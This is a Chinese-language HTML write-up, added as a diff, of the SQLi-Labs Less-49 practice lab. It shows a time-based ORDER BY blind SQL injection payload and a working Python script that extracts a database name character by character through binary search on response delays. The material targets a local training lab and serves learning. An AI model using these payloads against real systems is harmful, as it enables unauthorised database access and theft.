@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-49 字符型 ORDER BY 盲注 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-49 字符型 ORDER BY 盲注 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, ORDER BY注入, 时间盲注, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-49 (GET - Blind Based - String - ORDER BY)</li>
+        <li><strong>提示：</strong>注入点为 <code>sort</code> 参数，字符型闭合（<code>ORDER BY '$id'</code>），无报错、无回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与异常分析</h2>
+    <p>本关卡为字符型 <code>ORDER BY</code> 盲注，需使用单引号闭合并拼接逻辑判断。在实际测试中，若直接在浏览器发起带 <code>sleep(5)</code> 的请求，极易触发 <code>HTTP 500 Internal Server Error</code>。</p>
+    <p><strong>原因分析：</strong><code>ORDER BY</code> 会对结果集的每一行进行求值。如果全表多次触发长延时，会导致 PHP 脚本执行超时（通常默认 30 秒），Web 服务器会强行切断进程返回 500 错误。</p>
+
+    <h2>3. 操作步骤与自动化脚本</h2>
+    
+    <p><strong>第一步：手工验证逻辑</strong></p>
+    <p>在浏览器输入：<code>?sort=1' and if(id=1,sleep(2),0)-- -</code>。页面卡顿约 2 秒，证明通道存在。将延时缩短到 2 秒，可有效避免服务器崩溃。</p>
+
+    <p><strong>第二步：编写 Python 自动化脚本</strong></p>
+    <p>使用 VS Code 编写脚本，采用二分法快速逼近目标字符的 ASCII 码。脚本重点加入异常捕获与边界控制：</p>
+
+    <pre><code>import requests
+import time
+
+url = "http://localhost/sqli-labs-master/Less-49/"
+delay_threshold = 1.5 
+
+def get_ascii(payload, pos):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        # L49 专属构造：单引号闭合 + id=1 限制单次延时
+        inject = f"1' and if(id=1, if(ascii(substr(({payload}), {pos}, 1)) &gt; {mid}, sleep(2), 0), 0)-- -"
+        
+        try:
+            start_time = time.time()
+            # 设置 timeout 防止服务器彻底卡死
+            requests.get(url, params={"sort": inject}, timeout=10)
+            end_time = time.time()
+            
+            if (end_time - start_time) &gt; delay_threshold:
+                low = mid + 1
+            else:
+                high = mid - 1
+                
+        except requests.exceptions.Timeout:
+            # 请求超时视为延时生效（True）
+            low = mid + 1
+            
+    return low
+
+def extract(sql):
+    result = ""
+    for i in range(1, 50):
+        ascii_code = get_ascii(sql, i)
+        # 严格边界判断，遇到不可见字符（如空格）直接中断
+        if ascii_code &lt;= 32 or ascii_code &gt; 126:
+            break
+            
+        char = chr(ascii_code)
+        result += char
+        print(f"[+] 发现第 {i} 个字符: {char}，当前结果: {result}")
+        
+    return result
+
+if __name__ == "__main__":
+    print("[*] 开始 L49 时间盲注自动化...")
+    db_name = extract("select database()")
+    print(f"\n[*] 爆破完成，数据库名为: {db_name}")</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>try...except requests.exceptions.Timeout</code>：当服务器因卡顿导致请求超时时，直接判定条件为真（True），继续折半，避免脚本因网络报错而中断。</li>
+        <li><code>if ascii_code &lt;= 32</code>：解决之前遇到空字符无限循环输出空格的问题。当截取到不存在的字符时，立即跳出循环，保证输出结果的纯净。</li>
+    </ul>
+
+    <p><strong>执行结果：</strong>终端成功打印出 <code>security</code>，无任何报错与冗余输出。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>HTTP 500 超时问题：</strong>在编写 <code>ORDER BY</code> 盲注脚本或手工测试时，必须将 <code>sleep()</code> 的时长控制在 2 秒左右，并在脚本中加入超时捕获机制。</li>
+        <li><strong>边界条件控制：</strong>自动化脚本必须包含边界退出逻辑。若只依赖 <code>ascii_code == 0</code> 退出，容易因环境差异陷入空字符死循环。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
